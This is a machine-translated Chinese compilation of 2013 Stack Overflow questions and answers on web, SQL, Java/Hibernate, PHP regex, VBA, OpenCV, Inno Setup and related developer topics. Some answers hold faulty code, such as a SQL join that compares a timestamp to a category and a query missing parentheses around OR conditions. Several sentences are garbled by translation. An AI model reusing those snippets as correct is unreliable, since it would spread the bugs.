经过大量研究，我发现有一个类似于 IE6 可用的 PNG 透明度修复程序的修复程序，称为 CSS3Pie。解决方案的网站可以在这里找到：http: [//css3pie.com](http://css3pie.com)

您只需在您希望实现圆角的*任何地方*`behavior: url(path/to/pie_files/PIE.htc);`添加到您的 css中。

 *```
#myAwesomeElement {
    border: 1px solid #999;
    -webkit-border-radius: 10px;
    -moz-border-radius: 10px;
    border-radius: 10px;
    behavior: url(path/to/pie_files/PIE.htc);
} 
```*

# node.js - NodeJs 服务器问题，向多个客户端提供大文件

> ID：15533735
> 
> 赞同：0
> 
> 时间：2013-03-20T20:12:44.567
> 
> 标签：node.js, video-streaming, html5-video

我已经使用 NodeJs 创建了视频服务器应用程序。我能够提供所有静态应用程序文件，按预期上传视频。但我无法在两个不同的客户端上同时观看相同的媒体文件。它不会开始在不同的浏览器中播放媒体，直到它在早期的客户端上停止或暂停。仅当我尝试在不同客户端上播放相同文件时才会出现问题。

我尝试使用 http server range requests、express、connect、vid-server 模块。

我尝试使用 nginx、lighthttp 作为服务媒体文件。

您能否建议我如何同时向多个客户端提供大型（最大 1.5 GB）媒体文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:26:52.450

如果您在 Chrome/Chromium 中使用不同的选项卡，请注意您不能多次播放同一视频（[1](http://code.google.com/p/chromium/issues/detail?id=122557)、[2](http://code.google.com/p/chromium/issues/detail?id=31014)）。

（这种行为曾经让我很困惑）

而是使用不同的浏览器，甚至不同的计算机进行测试。

# iphone - iPhone 屏幕睡眠 - 内置接近传感器

> ID：15533736
> 
> 赞同：0
> 
> 时间：2013-03-20T20:12:45.270
> 
> 标签：iphone, ios, sleep, proximitysensor

你好

是否可以执行以下操作：

一种。用户将 iphone 屏幕面朝下放置。湾。屏幕休眠（黑色） c．该应用程序以全部功能在前台运行

我相信其他应用程序可能会通过接近传感器实现这一目标？

这会显着耗尽电池吗？

干杯!

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T20:26:17.037

你可以做：

```
[UIDevice currentDevice].proximityMonitoringEnabled = YES;
BOOL shouldDimScreen = [UIDevice currentDevice].proximityState;

if (shouldDimScreen) {
    // do whatever you want
} else {
    // light the screen back up
} 
```

如果您想在每次状态更改时知道，您可以使用`NSNotificationCenter`注册。`UIDeviceProximityStateDidChangeNotification`

但是，如果用户有一段时间没有触摸它，iOS 会自动为你关闭屏幕。因此，只要您不[关闭空闲计时器](http://developer.apple.com/library/ios/documentation/iphone/conceptual/iphoneosprogrammingguide/AdvancedAppTricks/AdvancedAppTricks.html#//apple_ref/doc/uid/TP40007072-CH7-SW63)，您的电池寿命就可以了，您可能不需要实现这一点。

# google-app-engine - 如何将本地服务器上运行的 appengine 应用程序与 GCM 服务器连接起来

> ID：15533741
> 
> 赞同：1
> 
> 时间：2013-03-20T20:12:56.423
> 
> 标签：google-app-engine, google-cloud-messaging

我创建了客户端-服务器项目来找出 GCM（谷歌云消息）服务。当我部署时，它在我的第一次尝试中运行良好:--

1）Android 应用程序到我的设备。

2) Appengine App 到 Appengine 服务器。

但是如果我需要主要在 appengine 应用程序上对项目进行更改，我会错过一件事。每次我需要部署到 appengine 服务器来测试它是否正常工作。它需要很多时间。

如何使用android DEVICE（作为客户端）而不是模拟器测试本地appengine服务器应用程序（作为服务器）......？？**我的意思是在本地服务器上运行的 appengine 应用程序如何连接到 GCM 服务器（在 WWW 上的某处），从而在我的 android 设备上产生推送通知......**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:55:26.400

要将消息发送到 GCM 服务器，您甚至不需要运行本地服务器。在本地计算机上运行的任何可以连接到 Internet 并发送 HTTP POST 请求的应用程序都可以向 GCM 服务器发送消息，该消息将发送到您的设备（假设您使用正确的注册 ID）。

如果您希望您的 Android 应用程序将注册 ID 发送到您的本地计算机，您只需要一个本地服务器。

这意味着您可以轻松地在本地测试大部分服务器代码，而无需设置本地服务器。

# sql - 无法优化这个复杂的 SQL 查询

> ID：15533747
> 
> 赞同：0
> 
> 时间：2013-03-20T20:13:38.713
> 
> 标签：sql

由于需要使用 AES_DECRYPT 以及其他一些棘手的情况，我有一个非常棘手的 SQL 查询需要很长时间。首先，这里是查询：

```
SELECT
CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ),
timestamp,
category,
status

FROM email_statuses

WHERE 

timestamp IN (
    SELECT MAX(timestamp)
    FROM email_statuses
    WHERE ( CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ?
        OR CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ? )
    AND category = 'EMAIL_TEMPLATE_01'
)

OR

timestamp IN (
    SELECT MAX(timestamp)
    FROM email_statuses
    WHERE ( CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ?
        OR CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ? )
    AND category = 'EMAIL_TEMPLATE_02'
) 

OR

timestamp IN (
    SELECT MAX(timestamp)
    FROM email_statuses
    WHERE ( CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ?
        OR CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ? )
    AND category = 'EMAIL_TEMPLATE_03'
); 
```

在每个显示时间戳 IN 的块中（...第一个 ? 是用户的主要电子邮件，第二个 ? 是用户的辅助电子邮件。

基本上，此查询所做的是返回 3 封电子邮件（类别 = 电子邮件名称）中每封电子邮件的最新状态列表。我只需要该用户的每个人的最新状态。例如，使用“email@domain.com”的查询结果可能如下所示：

```
email---------------timestamp----------category-------------status---------  

email@domain.com----0000-00-00 etc-----EMAIL_TEMPLATE_01----Sent  
email@domain.com----0000-00-00 etc-----EMAIL_TEMPLATE_02----Open & click through  
email@domain.com----0000-00-00 etc-----EMAIL_TEMPLATE_03----Open 
```

由于 email_status 表现在有超过 1000 条记录，因此查询最多需要 30 秒，因为它需要对状态表中的每个加密电子邮件行运行 convert/AES_DECRYPT。关于优化这个的方法有什么想法吗？我不是 SQL 专业人士。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:16:55.480

您可以做的一项优化是执行以下操作：

1.  首先 AES 加密提供电子邮件地址的参数
2.  重写每个查询以根据加密参数测试数据库表中的实际值

因此，每个查询都变成这样：

```
// precompute the encrypted parameter (maybe on the PHP side, before executing the query)

SELECT MAX(timestamp)
FROM email_statuses
WHERE email = ?              -- here pass the already encrpyed paramter
    OR email = ?             --       .. same here
AND category = 'EMAIL_TEMPLATE_02' 
```

基本思想是避免在查询中的每个测试上执行和`AES_ENCRYPT`或。`AES_DECRYPT`而不是只加密参数，并使用它进行测试..

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T20:18:57.783

将所有`in`语句组合成一个连接：

```
SELECT distinct CONVERT( AES_DECRYPT( es.email, '$key' ) USING UTF8 ),
       es.timestamp, es.category, es.status
FROM email_statuses es join
     (select category, MAX(timestamp) as maxtimestamp
      from email_statuses
      where ( CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ? or
            CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ? ) and
            category in ('EMAIL_TEMPLATE_01', 'EMAIL_TEMPLATE_02', 'EMAIL_TEMPLATE_03')
      group by category
     ) csum
     on es.timestamp = csum.category 
```

我还包括了一个`distinct`以防多个类别匹配。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T20:23:35.710

由于您有三个子查询，每个子查询都必须解密所有记录。如果您可以在一个子查询中执行此操作，则应该花费三分之一的时间。

```
SELECT CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ),
       timestamp, category, status
FROM email_statuses
WHERE 

timestamp IN (
    SELECT MAX(timestamp)
    FROM email_statuses
    WHERE ( CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ?
         OR CONVERT( AES_DECRYPT( email, '$key' ) USING UTF8 ) = ? )
        AND category IN ('EMAIL_TEMPLATE_01', 'EMAIL_TEMPLATE_02', 'EMAIL_TEMPLATE_03')
    GROUP BY category
) 
```

# sql-server-2008 - 如何计算 3 列中具有空值的记录

> ID：15533750
> 
> 赞同：-1
> 
> 时间：2013-03-20T20:13:39.930
> 
> 标签：sql-server-2008, tsql

我不是 SQL Server 2008 专家，但这是我想要完成的。假设我有这张桌子：

`col2, col3`我想计算在和`col4`where中没有值的记录`col1=1`，我试过这个：

```
SELECT COUNT(col1) 
FROM table 
WHERE 
    LEN(col2) > 1 OR LEN(col3) > 1 OR LEN(col4) > 1 AND col1 = '1' 
```

但我得到了数千条记录。如果你们中的任何人可以帮助或指出我正确的方向，我将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:15:08.163

只需添加更多 WHERE 条件

```
SELECT COUNT(col1) 
FROM   table 
WHERE  col2 IS NULL
  AND  col3 IS NULL 
  AND  col4 IS NULL 
  AND  col1='1' 
```

您的示例语言也与我们的示例代码相矛盾。您可能想要：

```
SELECT COUNT(col1) 
FROM   table 
WHERE  
  (    col2 IS NULL
  OR   col3 IS NULL 
  OR   col4 IS NULL 
  )
  AND  col1='1' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T20:43:13.423

[在http://msdn.microsoft.com/en-us/library/ms190276.aspx](http://msdn.microsoft.com/en-us/library/ms190276.aspx)检查运算符优先级

'AND' 在 'OR' 之前被评估，因此您的示例如下所示：

```
SELECT COUNT(col1) 
FROM table 
WHERE 
    LEN(col2) > 1 OR LEN(col3) > 1 OR ( LEN(col4) > 1 AND col1 = '1' ) 
```

这是一个相当开放的选择。你说：

> 我想计算没有值的记录

但是您的代码正在计算具有值的记录。所以也许你想要这个：

```
SELECT COUNT(col1)
FROM table
WHERE col1 = '1' AND
(  col2 IS NULL
OR col3 IS NULL
OR col4 IS NULL
) 
```

当您说：

其中 LEN(col2) > 0

但如果 col2 为 NULL，则 LEN(col2) 也为 NULL。不为零。

如果您的字符串是 '' 而不是 NULL，那么您可以检查长度：

```
SELECT COUNT(col1)
FROM table
WHERE col1 = '1' AND
(  LEN(col2) = 0
OR LEN(col3) = 0
OR LEN(col4) = 0
) 
```

当然，如果您确实打算查看非空值：

```
SELECT COUNT(col1)
FROM table
WHERE col1 = '1' AND
(  LEN(col2) > 0
OR LEN(col3) > 0
OR LEN(col4) > 0
) 
```

同样在您的示例中，您说 LEN() > 1。您的意思是大于 1 还是零？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T20:48:34.997

也许你想要：

```
SELECT COUNT(col1) 
FROM   table 
WHERE  
  (    COALESCE(col2,'')=''
  OR   COALESCE(col3,'')=''
  OR   COALESCE(col4,'')=''
  )
  AND  col1='1' 
```

# java - 如何使用带有 Struts 2 的 Hibernate 按任何列值删除记录

> ID：15533753
> 
> 赞同：4
> 
> 时间：2013-03-20T20:13:45.877
> 
> 标签：java, hibernate, jakarta-ee, struts2, crud

我正在使用 Struts2+Hibernate 并通过网络示例进行了理解。在此处的示例之一中[struts2+hibernate 示例](http://www.dzone.com/tutorials/java/struts-2/struts-2-example/struts-2-crud-example-1.html)

我可以看到并做的是，通过他们的 删除用户`id`，正如我们在那里看到的那样，为列表中的每个用户提供了一个删除链接，并`session.delete()`删除了记录`id`。现在我希望用户在给定的文本字段中输入名称，并且应该能够按名称删除。到目前为止，我已经尝试过这样

**行动方法：**

```
public String delete()
{
    //HttpServletRequest request = (HttpServletRequest) ActionContext.getContext().get( ServletActionContext.HTTP_REQUEST);
    //userDAO.delUser(Long.parseLong( request.getParameter("id")));
            userDAO.delUser(user.getName());
    return SUCCESS;
} 
```

**DAOImpl：**

```
@Override
public void delUser(String userName) {
    try {
        User user = (User) session.get(User.class, userName);
        session.delete(user);
    } catch (Exception e) {
        transaction.rollback();
        e.printStackTrace();
    } 
} 
```

我希望 Hibernate 可以通过提供的任何字段值删除一行。以上没有任何作用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T21:06:21.920

为什么不简单地使用 JPQL 删除查询？这将不需要休眠从数据库中恢复任何对象以简单地删除它。以下是如何在不先从数据库加载用户的情况下按名称删除用户：

```
 Query query = em.createQuery("delete from User where name=:name");
    query.setParameter("name", "Zigi");
    int deleted = query.executeUpdate();
    System.out.println("Deleted: " + deleted + " user(s)"); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-21T10:26:26.287

Hibernate 的问题是您无法通过某些属性值获取持久性实例，只能通过`id`. 如果你想通过`userName`试试这个来找到一个实例

```
public static final String USER_NAME = "userName";

private List<User> findByProperty(String propertyName, Object value) {
    log.debug("finding User instance with property: " + propertyName    + ", value: " + value);
    try {
        String queryString = "from User as model where model." + propertyName   + "= ?";
        Query queryObject = getSession().createQuery(queryString);
        queryObject.setParameter(0, value);
        return queryObject.list();
    } catch (RuntimeException re) {
        log.error("find by property name failed", re);
        throw re;
    }
}

public List<User> findByUserName(Object userName) {
    return findByProperty(USER_NAME, userName);
}

@Override
public void deleteUsers(String userName) {
  try {
    List<User> list = findByUserName(userName);
    for (User user: list)
      getSession().delete(user);
    log.debug("delete successful");
  } catch (RuntimeException re) {
    log.error("delete failed", re);
    throw re;
  }
} 
```

这将删除具有给定名称的所有用户，删除唯一用户确保该`user_name`字段具有唯一约束。可以通过表格上的注释来完成

```
@Table(name = "user", uniqueConstraints = {
        @UniqueConstraint(columnNames = "user_name")
}) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T20:28:08.700

您必须编写一个查询来获取用户`userName`。

例如

```
String qStr = "from User user where user.userName = :userName";
//then run the query to get the user
Query q = session.createQuery(qStr);
q.setParameter("userName", userName);
List<User> users = (List<User>) q.list();
//if the list is not empty, then users.get(0) will give you the object 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-10-29T07:06:59.410

```
public void deleteUser(Integer id)
{
    session = sessionfactory.openSession();
    tx = session.beginTransaction();
    try
    {           
        Query q=session.createQuery("delete from UserValidateLogin where userId=:userId");  
        q.setParameter("userId",id);  

        q.executeUpdate();    
        tx.commit();
    }
    catch(Exception e)
    {
        e.printStackTrace();
    }
    finally
    {
        session.close();
    }

} 
```

# localhost - localhost 端口 8000 和 8888 重定向到 8080

> ID：15533755
> 
> 赞同：2
> 
> 时间：2013-03-20T20:13:50.523
> 
> 标签：localhost, ports

我无法追踪是什么迫使 localhost:8000 和 localhost:8888 重定向到 localhost:8080。有没有人有一个想法？我在本地机器上，mac os x，而不是服务器。我使用过 jekyll、pow、haproxy、nodejs、webrick 和 mamp。现在他们都没有运行（据我所知）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:29:42.767

有很多小工具可以为您做到这一点。搜索端口转发工具...

您也可以使用 ssh 创建隧道。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-08T02:47:33.557

这是一个 bash 脚本，它将终止在特定端口上运行的进程。

```
lsof -n -i4TCP:3000 | grep LISTEN | tr -s ' ' | cut -f 2 -d ' ' | xargs kill -9 
```

只需替换`3000`为您想要杀死的所需端口即可。

这应该为您清除所有端口：

```
lsof -n -i4TCP:8080 | grep LISTEN | tr -s ' ' | cut -f 2 -d ' ' | xargs kill -9
lsof -n -i4TCP:8888 | grep LISTEN | tr -s ' ' | cut -f 2 -d ' ' | xargs kill -9
lsof -n -i4TCP:8000 | grep LISTEN | tr -s ' ' | cut -f 2 -d ' ' | xargs kill -9 
```

# php - PHP：正则表达式查询

> ID：15533757
> 
> 赞同：-8
> 
> 时间：2013-03-20T20:13:54.927
> 
> 标签：php, regex

$regex = '/[aeiou]*/'

会匹配“aeiioauo”还是只匹配“aaaaaaaaaaaa”、“eeeeeee”、“iiiiii”等（集合中只有一个字符的零个或多个）。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T20:30:58.993

由于这里没有严肃的答案，所以我会给出一个严肃的答案。

当你通过这个：

```
$regex = '/[aeiou]*/' 
```

到`preg_match`or `preg_match_all`（或其他一些函数），它将报告**任何 string**的匹配项。

`preg_match`, `preg_match_all`, `preg_replace`and `preg_replace_callback`all 默认情况下会找到匹配正则表达式的*非重叠* **子字符串。**（其他语言可能具有断言**整个字符串**与正则表达式匹配的功能，这是不同的）。

`[aeiou]*`将匹配任何连续出现的元音（英文）**0**次或多次。**由于正则表达式在根本没有字符（空字符串**）时也匹配，并且空字符串可以在任何字符串中的任何位置，因此您总是会得到至少一个匹配项。

要检查字符串*是否仅包含 vowels*，您需要*锚定*正则表达式，其中`^`表示字符串的开头并`$`表示字符串的结尾：

```
$regex = '/^[aeiou]*$/' 
```

仅当输入字符串仅包含元音或为空字符串时，上面的正则表达式才会匹配。
匹配示例：`aeuuuooiiii`, （空字符串）, `a`.
不匹配的示例：`aaaaaaaaaab`,`#@#$`

如果要匹配输入字符串中元音的一些连续序列（子字符串），则应使其至少匹配 1 个元音：所以我们`+`使用`*`

```
$regex = '/[aeiou]+/' 
```

匹配示例：`eeee`and `iiuo`in `ffffeeeeddiiuo`; `e`in`red`
不匹配示例：不匹配`nthng 2 s hr`

希望这有助于作为初学者的教程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:15:50.893

是的，它会的。`[]`表示任何集合，因此它将满足要求。但是由于您没有其他条件，因此这也将匹配任何其他字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:41:26.797

使用该正则表达式将匹配“aeiioauo”或仅匹配“aaaaaaaaaaaa”、“eeeeee”、“iiiii”

但它也会匹配空格，因此“aaaaeeee iiiiii”将匹配为

```
Array
(
   [0] => Array
   (
        [0] => aaaaeeee
        [1] => 
        [2] => iiiiii
        [3] => 
        [4] => 
    )

) 
```

代替

```
Array
(
    [0] => Array
    (
        [0] => aaaaeeee
        [1] => iiiiii
    )

) 
```

所以我建议将 ' * ' 更改为 ' + '

```
FROM --> $regex = '/[aeiou]*/';

TO   --> $regex = '/[aeiou]+/'; 
```

编辑：这是一个有用的站点，用于在 php 中测试正则表达式

[http://www.pagecolumn.com/tool/pregtest.htm](http://www.pagecolumn.com/tool/pregtest.htm)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T20:17:29.947

正则表达式将匹配它可以匹配的所有字符，因为正则表达式默认是贪婪的。顺便说一句：它不仅会匹配 iiiiii 等，还会匹配 aeiio 等。

# javascript - javascript如何从数组中删除每个第三个元素

> ID：15533759
> 
> 赞同：6
> 
> 时间：2013-03-20T20:13:57.353
> 
> 标签：javascript, arrays

如何从数组中删除每个第三个元素？

```
var TheArray = ['h', 'e', 'z', 'l', 'l', 'l', 'o'] 
```

如何在不创建新数组的情况下让它说“你好”？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-20T20:17:12.297

试试这个：

```
for (var i = 2; i <= TheArray.length; i += 2)
    TheArray.splice(i, 1); 
```

如果最后想要一个字符串，只需使用`TheArray.join("")`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-08-02T09:59:12.287

另一种方法是使用[Array.prototype.filter()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter)函数。以下是如何使用它删除每个第三个元素：

```
var TheArray = ['h', 'e', 'z', 'l', 'l', 'l', 'o']
TheArray = TheArray.filter(function(d, i){ return (i+1)%3 !== 0; }) 
```

希望能帮助到你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:17:41.393

如果您想要一个字符串，请不要更改数组。

```
var r = '';
for (var i=0; i<TheArray.length; i++) {
   if (i%3!=2) r += TheArray[i];
}
// now r is "hello" 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T20:19:29.490

试试这个：

```
var arr = ['h', 'e', 'z', 'l', 'l', 'l', 'o'];
for(var i = 2; i < arr.length; i+=2)
    arr.splice(i, 1);
console.log(arr); // outputs ['h','e','l','l','o'] 
```

# vba - 使用粗体单元格将同一行中的数据拉到另一个页面上

> ID：15533763
> 
> 赞同：0
> 
> 时间：2013-03-20T20:14:09.900
> 
> 标签：vba, excel

我有一个很大的工作簿，其中添加了新页面。这些页面都是名称 Week(x)。我有宏可以循环并收集数据以将其显示在摘要页面上。

但是，我想要一个可以显示某些数据的页面。该宏将遍历所有“Week()”页面并在 C 列中查找粗体。一旦它看到我希望它复制单元格 C:E 并将其粘贴到新页面上的单元格 D:F 中。

我有相当多的经验，但我希望能在这方面提供一些帮助。我也可以包含代码，这是我第一次发布，所以我将在下面发布。

```
Sub Front_Page() 
Dim lastrow As Long, i As Long 

For Each ws In Worksheets 
    If ws.Name <> "Summary" And ws.Name <> "Calenders" And ws.Name <> "Front Page" Then
         For i = 1 To 100 
             If Cells(i, 3).FONT.Bold Then 
                ws.Rang("C:E").Select              
                Selection.Copy 
                ActiveSheet.Range("D5:F5").End(xlUp).Offset(1, 0).PasteSpecial xlPasteValues 
    End If 
Next i 
End If 
Next ws 
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:59:27.937

```
Option Explicit

Sub Front_Page()
Dim lastrow As Long, i As Long
Dim ws As Worksheet

    lastrow = ActiveSheet.Range("D1000").End(xlUp).Row + 1

    For Each ws In Worksheets
        If ws.Name <> "Summary" And ws.Name <> "Calenders" _
                                And ws.Name <> "Front Page" Then
            For i = 1 To 100
                If ws.Cells(i, 3).Font.Bold Then
                    ActiveSheet.Cells(lastrow, 4).Resize(1, 3).Value = _
                                      ws.Cells(i, 3).Resize(1, 3).Value
                    lastrow = lastrow + 1
                End If
            Next i

        End If
    Next ws

End Sub 
```

# django - 如何在 Django 模板中获取用户的语言环境名称？

> ID：15533764
> 
> 赞同：1
> 
> 时间：2013-03-20T20:14:13.283
> 
> 标签：django, django-templates

我需要获取用户当前的语言环境名称作为特定插件的一些国际化过程的一部分，格式为 ll_CC（如 pt_BR、en_US、pl_PL），如[https://docs.djangoproject.com/en/dev/中所述](https://docs.djangoproject.com/en/dev/topics/i18n/) **在**Django 模板中的[主题/i18n/中。](https://docs.djangoproject.com/en/dev/topics/i18n/)到目前为止，我只能使用以下语言获取语言代码（格式为 pt-br、en-us、pl）：

```
{% load i18n %}
{% get_current_language as LANG %}
Your language is: {{ LANG }} 
```

但我需要语言环境名称。我怎样才能得到这个？非常感谢。

# ruby-on-rails - Ruby on rails 获得 # 参数

> ID：15533766
> 
> 赞同：2
> 
> 时间：2013-03-20T20:14:21.587
> 
> 标签：ruby-on-rails, request

如果我在查询字符串中得到#test，我正在尝试在后端做一些事情，但我似乎找不到。

有人知道如何获得这些变量吗？

示例网址

```
loocalhost:3000/#test 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:22:00.430

这称为[片段标识符](http://www.w3.org/Addressing/URL/4_2_Fragments.html)。

来自[http://www.w3.org/Addressing/URL/uri-spec.html](http://www.w3.org/Addressing/URL/uri-spec.html)

> 对文档特定部分的引用（包括片段标识符）可能看起来像
> 
> [http://www.myu.edu/org/admin/people#andy](http://www.myu.edu/org/admin/people#andy)
> 
> 在这种情况下，字符串“#andy”不会发送到服务器，而是由客户端保留并在检索到整个对象时使用。

# java - cvtColor 在 OpenCV for Java 中无法正常工作

> ID：15533768
> 
> 赞同：3
> 
> 时间：2013-03-20T20:14:39.400
> 
> 标签：java, android, opencv

所以我正在尝试使用该`calcCopticalFlowPyrLK`方法，但它不断抛出断言失败：

```
OpenCV Error: Assertion failed ((npoints = prevPtsMat.checkVector(2, CV_32F, true)) >= 0) 
```

checkVector 检查输入矩阵是否为 2 通道并且颜色深度为 CV_32F。我的输入是具有 4 个通道和 CV_8U 色深的 Mat。当我尝试转换它时，它每次都无法更改。我用了

```
Mat prevFrame; // The input Mat. Grabbed from CvCameraViewFrame. Converted to rgb

Mat prev = new Mat(rows,cols, CvType.CV_32F);
Imgproc.cvtColor(prevFrame, prev, Imgproc.COLOR_BGRA2GRAY);
prev.convertTo(prev, CvType.CV_32F); 
```

但是当我检查之后的 prev 具有正确的深度（CV_32F）但只有 1 个元素通道时。我已经为此苦苦挣扎了几个小时，但我无法弄清楚问题出在哪里

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-20T07:16:41.837

断言在 prevPtsMat 向量上失败，该向量是`calcOpticalFlowPyrLK`调用的第三个参数。您在这里定义的矩阵似乎是第一个参数，它应该是一个单通道图像，因为它已经是。 [http://docs.opencv.org/modules/video/doc/motion_analysis_and_object_tracking.html](http://docs.opencv.org/modules/video/doc/motion_analysis_and_object_tracking.html)

我想您正在为第三个参数使用点数组，您可能需要`MatOfPoint2f()`为点数组显式创建一个。我认为这已在： [Android: Using calcOpticalFlowPyrLK with MatOfPoint2f](https://stackoverflow.com/questions/12561292/android-using-calcopticalflowpyrlk-with-matofpoint2f)

# python-2.7 - 如何从 Inno Setup 通知 Python 环境路径已更改？

> ID：15533772
> 
> 赞同：1
> 
> 时间：2013-03-20T20:15:02.207
> 
> 标签：python-2.7, installation, inno-setup, pascal

所以我正在尝试创建一个具有以下步骤的安装程序：

1.  检查是否安装了 Python
2.  复制我的应用文件
3.  检查 Python 安装目录是否在 Windows 环境路径中
4.  检查 Python 脚本文件夹是否在 Windows 环境路径中
5.  **如果脚本文件夹不在 env 路径中，请添加它**
6.  **安装easy_install**
7.  **运行一个使用 easy_install 安装多个库的 python 脚本**

在最后几个步骤中遇到了问题。这是我当前使用的 Inno 设置的相关代码：

```
begin
  case CurStep of
     ssInstall:       // File transfer is about to begin.
     begin
        // Note: Use abort(); to terminate the install during this step.
     end;

ssPostInstall:   // File transfer has finished.
  begin
     // Make sure Python is in the path.
     sPythonInstallDir := _PythonGetInstallDir();
     _PathAddToSystem( sPythonInstallDir )
     _PathAddToSystem( sPythonInstallDir + 'Scripts;' )

     // Run the bundled Python script.
     ExtractTemporaryFile( 'build_setup_script.py' );
     ExtractTemporaryFile( 'ez_setup.py'           );
     _LaunchApp( AddQuotes( sPythonInstallDir + 'python.exe' ), AddQuotes( ExpandConstant( '{tmp}\build_setup_script.py' ) ), ExpandConstant( '{tmp}' ), SW_SHOW, ewWaitUntilTerminated, 300, nTime, nResultCode );
  end;

ssDone :         // After the Finish dialog.
  begin
  end;
end; 
```

这是python脚本：

```
def main(argv):
   ## Easy Install
   print("Installing easy_install")
   call(["Python", "ez_setup.py"])
...
   ## Installs server.py dependencies
   print("\nInstalling SQLAlchemy")
   call(["easy_install", "SQLAlchemy==0.7.8"])
... 
```

在 inno 设置中，我还有以下指令

```
[Setup]
...
ChangesEnvironment=true
... 
```

但是，根据这篇[文章](https://stackoverflow.com/questions/12550791/innosetup-sendmessage-after-changing-the-environment-values)，该指令仅在用户单击完成后才生效。

所以设置附加到路径：

```
...C:\Program Files (x86)\Git\cmd;;C:\Python27\;C:\Python27\Scripts; 
```

但是，然后脚本运行（这有效，因为 inno 似乎知道路径已更改并且可以执行 Python 文件）然后脚本将安装 easy_install，它出于某种原因可以工作，但是当它尝试使用 easy_install 时（这就是为什么C:Python\Scripts; 在路径中）它抛出一个文件未找到异常。

但是，当我第二次运行安装程序时，不做任何更改，easy_install 步骤就会起作用，因为现在当 Python 运行时，它可以检测到 easy_install 的路径。

我认为必须有一种方法可以在单击完成之前通知进程，但是复制上述[帖子](https://stackoverflow.com/questions/12550791/innosetup-sendmessage-after-changing-the-environment-values)中的代码甚至无法在 inno 中编译

```
SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, LPARAM(PChar('Environment')), SMTO_ABORTIFHUNG, 5000, MsgResult); 
```

要求用户第二次开始安装是不可能的，因为安装程序首先应该是自动化的......有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T21:59:39.777

如果您想通知所有窗口有关环境更改，如下代码（在向导完成并且[`ChangesEnvironment`](http://www.jrsoftware.org/ishelp/index.php?topic=setup_changesenvironment)指令设置为时由 InnoSetup 内部使用`yes`）：

```
SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
  LPARAM(PChar('Environment')), SMTO_ABORTIFHUNG, 5000, MsgResult); 
```

您可以使用以下导入（使用最新的 ANSI 和 Unicode 版本的 InnoSetup 进行测试）：

```
[Code]
#ifdef UNICODE
  #define AW "W"
#else
  #define AW "A"
#endif
const
  SMTO_ABORTIFHUNG = 2;
  WM_WININICHANGE = $001A;
  WM_SETTINGCHANGE = WM_WININICHANGE;
type
  LONG_PTR = LongInt;
  LRESULT = LONG_PTR;  
  WPARAM = UINT_PTR;
  LPARAM = LONG_PTR;

function SendTextMessageTimeout(hWnd: HWND; Msg: UINT;
  wParam: WPARAM; lParam: string; fuFlags: UINT; 
  uTimeout: UINT; var lpdwResult: DWORD_PTR): LRESULT;
  external 'SendMessageTimeout{#AW}@user32.dll stdcall'; 
```

并在脚本中需要时像此伪代码中所示调用它：

```
var
  MsgResult: DWORD_PTR;
begin
  if SendTextMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
    'Environment', SMTO_ABORTIFHUNG, 5000, MsgResult) <> 0
  then
    MsgBox('Success!', mbInformation, MB_OK)
  else
    MsgBox(SysErrorMessage(DLLGetLastError), mbError, MB_OK);
end; 
```

# linux - 我在哪里可以找到 GNU ar 文件格式规范？

> ID：15533778
> 
> 赞同：4
> 
> 时间：2013-03-20T20:15:23.330
> 
> 标签：linux, gnu, unix-ar

我需要访问一个 ar 创建的文件，但我找不到定义格式的规范文档。有人可以指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T20:17:28.960

来自[维基百科](http://en.wikipedia.org/wiki/Ar_%28Unix%29#File_format_details)：

> ar 格式从未被标准化；现代档案基于具有两种已知变体 BSD 和 GNU 的通用格式。

更多信息也在那里。

* * *

## 回答 #2

> 赞同：0
> 
